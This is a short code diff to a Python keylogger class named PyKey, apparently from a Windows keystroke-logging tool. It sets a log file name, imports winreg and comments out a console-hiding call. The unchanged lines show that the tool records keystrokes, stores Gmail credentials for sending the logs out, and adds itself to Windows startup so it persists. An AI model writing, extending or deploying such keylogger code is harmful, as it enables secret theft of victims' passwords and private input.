@@ -24,7 +24,7 @@ class PyKey:
         self.EMAIL_TO=''
         self.GMAIL_USER=''
         self.GMAIL_PWD=''
-        self.LOG_FILE = ''
+        self.LOG_FILE = 'log.dat'
         self.TERMINATE_KEY = "esc"
         self.CLEAR_ON_STARTUP = False
         self.MAP = {
@@ -231,12 +231,14 @@ class PyKey:
         import atexit
         import os
         import keyboard
+        from winreg import *
+
 
         if self.CLEAR_ON_STARTUP:
             os.remove(self.LOG_FILE)
 
         self.addToWindowsStartup()
-        self.hideWindowsConsole()
+        #self.hideWindowsConsole()
 
         is_down = {}
         output = open(self.LOG_FILE, "r+")
